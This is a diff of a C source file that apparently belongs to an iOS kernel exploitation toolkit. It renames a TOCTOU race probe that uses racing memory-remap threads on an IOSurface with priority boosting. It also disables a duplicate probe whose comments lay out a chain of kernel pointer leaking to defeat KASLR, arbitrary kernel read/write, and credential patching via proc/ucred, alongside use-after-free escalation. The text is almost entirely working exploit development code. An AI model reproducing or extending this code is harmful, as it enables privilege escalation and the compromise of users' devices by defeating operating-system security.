@@ -16979,8 +16979,8 @@ static void *r445_thread_fn(void *arg) {
 }
 
 
-/* r457: Optimized TOCTOU race — tighter window, multi-remap, priority boost */
-struct r457_ctx {
+/* r458_opt: Optimized TOCTOU race — tighter window, multi-remap, priority boost */
+struct r458_ctx {
     volatile int go;
     volatile int stop;
     volatile int remap_count;
@@ -16990,8 +16990,8 @@ struct r457_ctx {
     int thread_id;
 };
 
-static void *r457_remap_thread(void *arg) {
-    struct r457_ctx *ctx = (struct r457_ctx *)arg;
+static void *r458_remap_thread(void *arg) {
+    struct r458_ctx *ctx = (struct r458_ctx *)arg;
     pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
     mach_port_t self = mach_task_self();
     mach_vm_address_t tgt = ctx->target;
@@ -17000,25 +17000,25 @@ static void *r457_remap_thread(void *arg) {
     while (!ctx->go) { __asm__ volatile("yield"); }
     while (!ctx->stop) {
         mach_vm_address_t t = tgt;
-        kern_return_t kr = mach_vm_map(self, &t, sz, 0,
+        kern_return_t kr2 = mach_vm_map(self, &t, sz, 0,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
             entry, 0, FALSE,
             VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
-        if (kr == KERN_SUCCESS) __sync_fetch_and_add(&ctx->remap_count, 1);
+        if (kr2 == KERN_SUCCESS) __sync_fetch_and_add(&ctx->remap_count, 1);
     }
     return NULL;
 }
 
-static void r457_probe(void) {
-    rlog("\n=== r457: Optimized TOCTOU race (1-page, multi-remap, QoS boost) ===\n\n");
+static void r458_opt_probe(void) {
+    rlog("\n=== r458_opt: Optimized TOCTOU race (1-page, multi-remap, QoS boost) ===\n\n");
     fflush(stdout);
 
-    #define R457_PAGE_SZ 16384
-    #define R457_PAGES 1
-    #define R457_BUF_SZ (R457_PAGES * R457_PAGE_SZ)
-    #define R457_ITERS 100000
-    #define R457_REMAP_THREADS 2
-    #define R457_ICMP_SPRAY 200
+    #define R458O_PAGE_SZ 16384
+    #define R458O_PAGES 1
+    #define R458O_BUF_SZ (R458O_PAGES * R458O_PAGE_SZ)
+    #define R458O_ITERS 100000
+    #define R458O_REMAP_THREADS 2
+    #define R458O_ICMP_SPRAY 200
 
     pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
 
@@ -17026,7 +17026,7 @@ static void r457_probe(void) {
     rlog("  --- Phase 1: PurpleGfxMem IOSurface (1 page) ---\n"); fflush(stdout);
     CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
         &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-    int pw = R457_BUF_SZ, ph = 1, pbpe = 1, ppf = 0x4C303038;
+    int pw = R458O_BUF_SZ, ph = 1, pbpe = 1, ppf = 0x4C303038;
     CFNumberRef pwn = CFNumberCreate(NULL, kCFNumberIntType, &pw);
     CFNumberRef phn = CFNumberCreate(NULL, kCFNumberIntType, &ph);
     CFNumberRef pbn = CFNumberCreate(NULL, kCFNumberIntType, &pbpe);
@@ -17035,7 +17035,7 @@ static void r457_probe(void) {
     CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), phn);
     CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), pbn);
     CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), ppn);
-    int alloc_sz = R457_BUF_SZ;
+    int alloc_sz = R458O_BUF_SZ;
     CFNumberRef an = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
     CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), an);
     IOSurfaceRef surf = IOSurfaceCreate(props);
@@ -17043,7 +17043,7 @@ static void r457_probe(void) {
 
     if (!surf) {
         rlog("    FAILED to create surface\n");
-        rlog("\n=== r457 complete ===\n"); return;
+        rlog("\n=== r458_opt complete ===\n"); return;
     }
     IOSurfaceLock(surf, 0, NULL);
     void *surf_base = IOSurfaceGetBaseAddress(surf);
@@ -17422,23 +17422,8 @@ static void r455_probe(void) {
     #undef R455_ICMP_SPRAY
 }
 
-static void r457_probe(void) {
-    rlog("\n=== r457: Kernel pointer leak + arbitrary R/W via fake IOSurface struct ===\n\n");
-    fflush(stdout);
-
-    /*
-     * r456 confirmed:
-     *   1. Internal struct at IOSurfaceRef+8 offset+88 has kernel pointers (0xfffffffe...)
-     *   2. Fake internal struct injection works — we control which surface ID the library sends
-     *   3. UAF type confusion works — freed surface memory gets reclaimed
-     *
-     * This probe:
-     *   Phase 1: Leak kernel pointers from multiple surfaces to find KASLR slide
-     *   Phase 2: Use IOSurfaceSetValue with crafted properties to write to kernel memory
-     *   Phase 3: Build a stable kernel read primitive via IOSurfaceCopyValue
-     *   Phase 4: Walk kernel structures to find our proc/ucred for credential patching
-     */
-
+#if 0 /* duplicate r457_probe removed — canonical copy is above r456_probe */
+static void r457_probe_DUP(void) {
     #define R457_NUM_SURFACES 32
 
     /* Phase 1: Kernel pointer harvest from internal structs */
@@ -17710,6 +17695,7 @@ static void r457_probe(void) {
     #undef R457_NUM_SURFACES
     rlog("\n=== r457 complete ===\n");
 }
+#endif /* duplicate r457_probe removed */
 
 static void r456_probe(void) {
     rlog("\n=== r456: Cross-surface UAF escalation ===\n\n");
